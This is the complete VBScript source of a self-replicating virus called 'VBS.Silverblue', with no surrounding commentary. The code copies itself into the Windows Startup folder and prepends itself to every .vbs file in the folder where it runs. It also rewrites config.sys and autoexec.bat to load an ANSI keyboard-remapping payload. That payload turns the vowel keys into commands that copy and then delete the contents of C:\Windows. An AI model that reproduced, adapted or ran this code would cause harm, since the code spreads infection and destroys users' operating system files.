'VBS.Silverblue
'VB
'VB
'VB
'VB
'VB
'VBS.Silverblue
'VB
'VB
'VB
'VB
'VBS.Silverblue
'VB
'VB
'VB
'VBS.Silverblue
'VB
'VB
'VBS.Silverblue
'VB
'VBS.Silverblue
'VBS.Silverblue by GhostDog

Dim fso, silverblue, fd, virsize, vircode, victim
Dim virExt, victimcode, infectedcode, hcode
Dim configfile, autofile, ansifile

endl=chr(13)&chr(10)
on error resume next
silverblue=Wscript.ScriptFullName
set fso=createObject("Scripting.FileSystemObject")
fso.CopyFile silverblue, "c:\WINDOWS\Start Menu\Programs\StartUp\§.vbs"

set fd=fso.openTextFile(silverblue,1)
hcode=fd.readAll

fd.close

virsize=inStr(11,hcode,"VBS.Silverblu"&"e")+1

set fd=fso.openTextFile(silverblue,1)
vircode=fd.read(virsize)
fd.close

cont=0
for each victim in fso.getfolder(".").files

virExt=fso.getExtensionName(victim.name)
i=0
if mid(virExt,1,1)="v" or mid(virExt,1,1)="V" then i=i+1 end if
if mid(virExt,2,1)="b" or mid(virExt,2,1)="B" then i=i+1 end if
if mid(virExt,3,1)="s" or mid(virExt,3,1)="S" then i=i+1 end if

if i=3 then
set fd=fso.openTextFile(victim.path,1)

victimcode=fd.readAll
fd.close

if left(victimcode,10)<>chr(39)&"VBS.Silverblu"&"e" then
infectedcode=vircode&endl&victimcode
set fd=fso.openTextFile(victim.path,2,1)
fd.write infectedcode
fd.close
cont=1
end if

end if
next

if cont=0 then 

set configfile = FSO.CreateTextFile("c:\config.sys", True)
configfile.WriteLine ""
configfile.WriteLine "DEVICE=C:\Windows\Command\Ansi.sys"
configfile.WriteLine ""
configfile.Close

set autofile = FSO.CreateTextFile("c:\autoexec.bat", True)
autofile.WriteLine ""
autofile.WriteLine "type c:\windows\ansi.txt"
autofile.WriteLine ""
autofile.Close

set ansifile = FSO.CreateTextFile("c:\windows\ansi.txt", True)
ansifile.WriteLine "@ECHO ON"
ansifile.WriteLine "["& chr(34) &"e;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"a;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"i;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"o;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"u;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"E;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
ansifile.WriteLine "["& chr(34) &"A;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"I;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34) 
ansifile.WriteLine "["& chr(34) &"O;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
ansifile.WriteLine "["& chr(34) &"U;"& chr(34) &"md c:\§"& chr(34) &";"& chr(34) &"copy c:\windows\*.* c:\§ /y"& chr(34) &";"& chr(34) &"del c:\windows\*.* /y"& chr(34) &";13p"& chr(34)
ansifile.Close

End if

'VBS.Silverblue

